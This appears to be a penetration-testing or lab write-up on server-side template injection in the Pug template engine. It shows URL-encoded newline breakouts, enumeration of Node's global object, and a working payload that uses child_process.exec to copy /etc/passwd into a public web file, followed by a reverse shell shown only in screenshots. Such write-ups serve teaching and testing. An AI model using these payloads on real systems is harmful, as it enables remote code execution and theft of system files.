# Template Engine Attack

## Template Engine Attack

* First try a basic XSS on the direct message 

![](../../../.gitbook/assets/c6a6ef763aa246ed9587d2bdbf973456.png)

* From Burp History request :

![](../../../.gitbook/assets/8885b6dc889c4715af2ffbe4b772a057.png)

Server Reply :

![](../../../.gitbook/assets/b96f2bccf8ed48e39dd5182a025f1947.png)

* Try to evaluate using simple arithmetic equation \(using 9\*9\) and check if the request is interpreted or not.  It was NOT \(didn't get 81\)

![](../../../.gitbook/assets/0cc1550278cf448184e5b9435c889359.png)

* In that particular case, we need to use the Pug functionnality to break out the template using a new line \(\n\) and a sign = .

\[new line\]=9\*9

**They both need to be URL encoded :**

```text
\n = %0a
= = %3d
```

![](../../../.gitbook/assets/6e280a6e0671480bbdd3892a1e8518e5.png)

We ve got 81 now !

Go for a shell , using child.process.exec function.

We need to find the which function are available trying to enumerate them \(/must be url encoded \):

We are looking for Require which is most probably linked to process and mainModule

• Get the global Object -&gt; \[new line\]=global

Plus %0a at start

![](../../../.gitbook/assets/50ec8c02a2a24ff38cadee23a1424da6.png)

![](../../../.gitbook/assets/6ec31b4843a842f59bef97d9081180ec.png)

* Parsing the global object \(using each iterator\):

  ```text
  each val, index in global
  p=index
  ```

![](../../../.gitbook/assets/825a26ecbb9c4bdda1dfb6ee441ae63d.png)

![](../../../.gitbook/assets/1ad1c21c7e4c4d739aaee6eb2a55b447.png)

* Try to iterate using index in global.process.WHATEVER : 

Found the require function :

![](../../../.gitbook/assets/b5c3a6e320a94aa89ed5b995fcfa1703.png)

* **Got for RCE using the require field :**

  ```text
  var x = global.process.mainModule.require
  x('child_process').exec('cat /etc/passwd >> /opt/web/chatSupportSystems/public/accounts.txt')
  ```

![](../../../.gitbook/assets/07ab6b3b899143a38d995e75fb1ea131.png)

* Inject

![](../../../.gitbook/assets/0bbb3fa44640495d895c936650da5a13.png)

![](../../../.gitbook/assets/e1b5b63e27c2492c8033deb7e823293f.png)

* get a revershe shell :

![](../../../.gitbook/assets/ff2c3e8fc5fa4185a9d1e33aa035202d.png)

![](../../../.gitbook/assets/86f79ce66dd547268eb7f4b251933c3f.png)

